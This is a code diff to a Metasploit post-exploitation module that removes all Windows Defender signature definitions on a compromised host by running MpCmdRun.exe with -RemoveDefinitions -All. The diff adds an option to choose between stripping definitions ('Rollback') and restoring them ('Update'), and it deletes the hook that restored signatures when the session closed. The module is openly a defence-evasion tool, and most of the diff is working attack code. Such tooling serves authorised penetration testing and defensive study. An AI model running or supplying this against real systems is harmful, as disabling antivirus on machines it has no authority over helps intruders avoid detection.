@@ -27,9 +27,8 @@ class MetasploitModule < Msf::Post
       ))
     register_options(
       [
-        OptBool.new('AUTO_CLEANUP', [ true, 'Attempt to return protections after session exit', true ])
+        OptEnum.new('ACTION', [ true, 'Action to perform (Update/Rollback)', 'Rollback', ['rollback', 'update']])
       ])
-
   end
   
   def run
@@ -50,29 +49,21 @@ class MetasploitModule < Msf::Post
     disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, "DisableAntiSpyware", REGISTRY_VIEW_NATIVE)
     if disable_key_value.nil? || disable_key_value != 1
       print_status("Removing All Definitions for Windows Defender")
-      cmd = cmd_exec('cmd.exe', "/c \"#{file_path}\" -RemoveDefinitions -All")
-      if cmd.include?('denied')
-        print_bad("#{cmd}")
+      print_status(datastore['ACTION'])
+      if datastore['ACTION'].casecmp('Rollback') == 0
+        cmd = "cmd.exe /c \"#{file_path}\" -RemoveDefinitions -All"
       else
-        print_status("#{cmd}")
+        cmd = "cmd.exe /c \"#{file_path}\" -SignatureUpdate"
+      end
+      print_status("Running #{cmd}")
+      output = cmd_exec(cmd)
+      if output.include?('denied')
+        print_bad("#{output}")
+      else
+        print_status("#{output}")
       end
     else
       fail_with(Failure::BadConfig, "Defender is not Enabled")
     end
   end
-
-  def on_session_close(session,reason='')
-    print_status("Returning Defender Signatures ")
-    update_signatures
-  end
-
-  def update_signatures
-    print_status("In Cleanup")
-    program_path = session.sys.config.getenv('ProgramFiles')
-    vprint_status("program_path = #{program_path}")
-    file_path = program_path + '\Windows Defender\MpCmdRun.exe'
-    cmd = cmd_exec('cmd.exe', "/c \"#{file_path}\" -SignatureUpdate")
-    print_status("#{cmd}")
-  end
 end
-0
